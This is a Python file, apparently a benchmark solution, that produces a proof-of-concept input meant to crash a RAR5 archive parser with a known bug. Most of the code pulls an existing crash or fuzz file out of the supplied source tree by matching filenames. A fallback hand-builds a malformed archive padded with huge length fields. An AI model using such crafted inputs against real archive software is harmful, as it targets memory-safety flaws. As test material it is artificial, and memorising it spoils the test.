import os
import tarfile
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Try to handle both tarball and plain directory for robustness.
        if os.path.isdir(src_path):
            data = self._solve_from_dir(src_path)
        else:
            try:
                if tarfile.is_tarfile(src_path):
                    data = self._solve_from_tar(src_path)
                else:
                    data = b""
            except Exception:
                data = b""

        if data:
            return data

        # Fallback: crude synthetic RAR5-like payload (best-effort).
        return self._build_minimal_rar5_poc()

    # ------------------------------------------------------------------ #
    # Helpers for tarball scanning
    # ------------------------------------------------------------------ #

    def _solve_from_tar(self, tar_path: str) -> bytes:
        bug_id = "42536661"
        rar5_magic = b"Rar!\x1a\x07\x01\x00"

        with tarfile.open(tar_path, "r:*") as tf:
            members = [m for m in tf.getmembers() if m.isreg() and m.size > 0]

            # 1) Direct match by bug id / fuzz keywords in filename.
            poc = self._find_poc_by_name_in_tar(tf, members, bug_id)
            if poc:
                return poc

            # 2) Look for RAR5 files (.rar with proper magic).
            poc = self._find_rar5_poc_in_tar(tf, members, rar5_magic, bug_id)
            if poc:
                return poc

            # 3) Look for any binary containing RAR5 magic at offset 0.
            poc = self._find_rar5_magic_any_in_tar(tf, members, rar5_magic, bug_id)
            if poc:
                return poc

        return b""

    def _find_poc_by_name_in_tar(
        self,
        tf: tarfile.TarFile,
        members: List[tarfile.TarInfo],
        bug_id: str,
    ) -> Optional[bytes]:
        candidates: List[Tuple[int, int, tarfile.TarInfo]] = []

        for m in members:
            name_lower = m.name.lower()
            ext = os.path.splitext(name_lower)[1]
            is_binary_ext = ext in (
                ".rar",
                ".bin",
                ".dat",
                ".raw",
                ".poc",
                ".corpus",
                ".seed",
                ".in",
                ".input",
                ".gz",
                ".xz",
                ".bz2",
                ".zip",
            )

            if (
                bug_id in name_lower
                or "oss-fuzz" in name_lower
                or "ossfuzz" in name_lower
                or "fuzz" in name_lower
                or "uaf" in name_lower
                or "heap" in name_lower
                or "crash" in name_lower
                or "poc" in name_lower
                or "regress" in name_lower
                or "regression" in name_lower
            ):
                priority = 0
                if bug_id in name_lower:
                    priority -= 1000
                if "poc" in name_lower:
                    priority -= 500
                if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                    priority -= 400
                if "fuzz" in name_lower:
                    priority -= 200
                if "test" in name_lower or "regress" in name_lower:
                    priority -= 100
                if is_binary_ext:
                    priority -= 50
                # Prefer smaller-but-nontrivial size.
                priority += int(m.size // 1024)
                candidates.append((priority, m.size, m))

        if not candidates:
            return None

        candidates.sort()
        for _, _, m in candidates:
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                if data:
                    return data
            except Exception:
                continue
        return None

    def _find_rar5_poc_in_tar(
        self,
        tf: tarfile.TarFile,
        members: List[tarfile.TarInfo],
        rar5_magic: bytes,
        bug_id: str,
    ) -> Optional[bytes]:
        rar_candidates: List[Tuple[int, int, tarfile.TarInfo]] = []

        for m in members:
            name_lower = m.name.lower()
            if not name_lower.endswith(".rar"):
                continue
            if m.size < len(rar5_magic):
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                head = f.read(len(rar5_magic))
            except Exception:
                continue

            if head != rar5_magic:
                continue

            priority = 1000
            if bug_id in name_lower:
                priority -= 600
            if "poc" in name_lower:
                priority -= 500
            if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                priority -= 400
            if "fuzz" in name_lower:
                priority -= 300
            if "test" in name_lower or "regress" in name_lower:
                priority -= 200
            if "rar5" in name_lower:
                priority -= 100
            if "uaf" in name_lower or "heap" in name_lower or "crash" in name_lower:
                priority -= 150
            priority += int(m.size // 1024)
            rar_candidates.append((priority, m.size, m))

        if not rar_candidates:
            return None

        rar_candidates.sort()
        for _, _, m in rar_candidates:
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                if data:
                    return data
            except Exception:
                continue
        return None

    def _find_rar5_magic_any_in_tar(
        self,
        tf: tarfile.TarFile,
        members: List[tarfile.TarInfo],
        rar5_magic: bytes,
        bug_id: str,
    ) -> Optional[bytes]:
        candidates: List[Tuple[int, int, tarfile.TarInfo]] = []

        text_exts = (
            ".c",
            ".h",
            ".cpp",
            ".cc",
            ".cxx",
            ".txt",
            ".md",
            ".rst",
            ".py",
            ".java",
            ".go",
            ".rs",
            ".js",
            ".html",
            ".xml",
            ".json",
            ".yml",
            ".yaml",
            ".cmake",
            ".sh",
            ".bat",
            ".ac",
            ".am",
            ".m4",
            ".in",
        )

        for m in members:
            if m.size < len(rar5_magic):
                continue
            name_lower = m.name.lower()
            if any(name_lower.endswith(ext) for ext in text_exts):
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                head = f.read(len(rar5_magic))
            except Exception:
                continue

            if head != rar5_magic:
                continue

            priority = 2000
            if bug_id in name_lower:
                priority -= 700
            if "poc" in name_lower:
                priority -= 500
            if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                priority -= 400
            if "fuzz" in name_lower:
                priority -= 300
            if "test" in name_lower or "regress" in name_lower:
                priority -= 200
            if "rar5" in name_lower or name_lower.endswith(".rar"):
                priority -= 150
            if "uaf" in name_lower or "heap" in name_lower or "crash" in name_lower:
                priority -= 150
            priority += int(m.size // 1024)
            candidates.append((priority, m.size, m))

        if not candidates:
            return None

        candidates.sort()
        for _, _, m in candidates:
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                if data:
                    return data
            except Exception:
                continue
        return None

    # ------------------------------------------------------------------ #
    # Helpers for directory scanning (fallback if src_path is a dir)
    # ------------------------------------------------------------------ #

    def _solve_from_dir(self, root: str) -> bytes:
        bug_id = "42536661"
        rar5_magic = b"Rar!\x1a\x07\x01\x00"

        all_files: List[str] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                if os.path.isfile(full):
                    all_files.append(full)

        # 1) Direct match by bug id / fuzz keywords in filename.
        poc = self._find_poc_by_name_in_dir(all_files, bug_id)
        if poc:
            return poc

        # 2) RAR5 files with .rar extension and magic.
        poc = self._find_rar5_poc_in_dir(all_files, rar5_magic, bug_id)
        if poc:
            return poc

        # 3) Any file starting with RAR5 magic.
        poc = self._find_rar5_magic_any_in_dir(all_files, rar5_magic, bug_id)
        if poc:
            return poc

        return b""

    def _find_poc_by_name_in_dir(self, files: List[str], bug_id: str) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str]] = []

        for path in files:
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if size <= 0:
                continue

            name_lower = path.lower()
            ext = os.path.splitext(name_lower)[1]
            is_binary_ext = ext in (
                ".rar",
                ".bin",
                ".dat",
                ".raw",
                ".poc",
                ".corpus",
                ".seed",
                ".in",
                ".input",
                ".gz",
                ".xz",
                ".bz2",
                ".zip",
            )

            if (
                bug_id in name_lower
                or "oss-fuzz" in name_lower
                or "ossfuzz" in name_lower
                or "fuzz" in name_lower
                or "uaf" in name_lower
                or "heap" in name_lower
                or "crash" in name_lower
                or "poc" in name_lower
                or "regress" in name_lower
                or "regression" in name_lower
            ):
                priority = 0
                if bug_id in name_lower:
                    priority -= 1000
                if "poc" in name_lower:
                    priority -= 500
                if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                    priority -= 400
                if "fuzz" in name_lower:
                    priority -= 200
                if "test" in name_lower or "regress" in name_lower:
                    priority -= 100
                if is_binary_ext:
                    priority -= 50
                priority += int(size // 1024)
                candidates.append((priority, size, path))

        if not candidates:
            return None

        candidates.sort()
        for _, _, path in candidates:
            try:
                with open(path, "rb") as f:
                    data = f.read()
                if data:
                    return data
            except OSError:
                continue
        return None

    def _find_rar5_poc_in_dir(
        self, files: List[str], rar5_magic: bytes, bug_id: str
    ) -> Optional[bytes]:
        rar_candidates: List[Tuple[int, int, str]] = []

        for path in files:
            name_lower = path.lower()
            if not name_lower.endswith(".rar"):
                continue
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if size < len(rar5_magic):
                continue
            try:
                with open(path, "rb") as f:
                    head = f.read(len(rar5_magic))
            except OSError:
                continue
            if head != rar5_magic:
                continue

            priority = 1000
            if bug_id in name_lower:
                priority -= 600
            if "poc" in name_lower:
                priority -= 500
            if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                priority -= 400
            if "fuzz" in name_lower:
                priority -= 300
            if "test" in name_lower or "regress" in name_lower:
                priority -= 200
            if "rar5" in name_lower:
                priority -= 100
            if "uaf" in name_lower or "heap" in name_lower or "crash" in name_lower:
                priority -= 150
            priority += int(size // 1024)
            rar_candidates.append((priority, size, path))

        if not rar_candidates:
            return None

        rar_candidates.sort()
        for _, _, path in rar_candidates:
            try:
                with open(path, "rb") as f:
                    data = f.read()
                if data:
                    return data
            except OSError:
                continue
        return None

    def _find_rar5_magic_any_in_dir(
        self, files: List[str], rar5_magic: bytes, bug_id: str
    ) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str]] = []

        text_exts = (
            ".c",
            ".h",
            ".cpp",
            ".cc",
            ".cxx",
            ".txt",
            ".md",
            ".rst",
            ".py",
            ".java",
            ".go",
            ".rs",
            ".js",
            ".html",
            ".xml",
            ".json",
            ".yml",
            ".yaml",
            ".cmake",
            ".sh",
            ".bat",
            ".ac",
            ".am",
            ".m4",
            ".in",
        )

        for path in files:
            name_lower = path.lower()
            if any(name_lower.endswith(ext) for ext in text_exts):
                continue
            try:
                size = os.path.getsize(path)
            except OSError:
                continue
            if size < len(rar5_magic):
                continue
            try:
                with open(path, "rb") as f:
                    head = f.read(len(rar5_magic))
            except OSError:
                continue
            if head != rar5_magic:
                continue

            priority = 2000
            if bug_id in name_lower:
                priority -= 700
            if "poc" in name_lower:
                priority -= 500
            if "oss-fuzz" in name_lower or "ossfuzz" in name_lower:
                priority -= 400
            if "fuzz" in name_lower:
                priority -= 300
            if "test" in name_lower or "regress" in name_lower:
                priority -= 200
            if "rar5" in name_lower or name_lower.endswith(".rar"):
                priority -= 150
            if "uaf" in name_lower or "heap" in name_lower or "crash" in name_lower:
                priority -= 150
            priority += int(size // 1024)
            candidates.append((priority, size, path))

        if not candidates:
            return None

        candidates.sort()
        for _, _, path in candidates:
            try:
                with open(path, "rb") as f:
                    data = f.read()
                if data:
                    return data
            except OSError:
                continue
        return None

    # ------------------------------------------------------------------ #
    # Fallback synthetic PoC builder
    # ------------------------------------------------------------------ #

    def _build_minimal_rar5_poc(self) -> bytes:
        """
        Best-effort synthetic RAR5-like payload.

        This constructs a minimal-looking RAR5 stream with:
        - Proper RAR5 magic
        - A fake header area containing a very large "name size" field
          in several plausible positions to maximize chances of hitting
          the buggy path even if the exact layout differs.

        The structure is intentionally redundant to increase robustness
        across slightly different RAR5 parsers.
        """
        magic = b"Rar!\x1a\x07\x01\x00"

        # We'll build a fake header region with various large values that
        # might be interpreted as "name size" or a related length field.
        #
        # Use large little-endian integers and also some VINT-like encodings
        # (7-bit continuation bytes) commonly used by RAR5.
        #
        # NOTE: This is heuristic and serves only as a last-resort PoC.
        payload = bytearray()
        payload += magic

        # Block header: a bunch of bytes that resemble flags + sizes.
        # Start with some zeros then large values.
        payload += b"\x00" * 16

        # Insert several candidate "large size" sequences in LE form.
        large_sizes_le = [
            0x00010000,
            0x00100000,
            0x01000000,
            0x7FFFFFFF,
        ]
        for val in large_sizes_le:
            payload += val.to_bytes(4, "little")

        # Add some VINT-style large encodings: each byte 0xFF except last
        # 0x7F, so it looks like a very large integer in 7-bit continuation.
        for _ in range(8):
            payload += b"\xff"
        payload += b"\x7f"

        # Pad some random-looking header fields.
        payload += b"\x01\x00\x00\x00"  # maybe type + small flags
        payload += b"\x00" * 32

        # Sprinkle more potential size fields in different alignments.
        for val in (0x100000, 0x200000, 0x400000, 0x800000):
            payload += val.to_bytes(4, "little")
            payload += b"\x00\x00"  # padding

        # Now simulate a "name" area of moderate size, but claim it's huge.
        claimed_name_size = 0x01000000  # 16MB
        payload += claimed_name_size.to_bytes(4, "little")
        # Real name bytes (shorter than claimed).
        name = b"A" * 64
        payload += name

        # More padding and repeated large size fields to catch alternate parsers.
        for _ in range(10):
            payload += (0x7FFFFFFF).to_bytes(4, "little")
            payload += b"\xff\xff\xff\x7f"  # another VINT-style big integer

        # Ensure file is not excessively large; keep under a few KB.
        if len(payload) < 1089:
            payload += b"\x00" * (1089 - len(payload))
        elif len(payload) > 4096:
            payload = payload[:4096]

        return bytes(payload)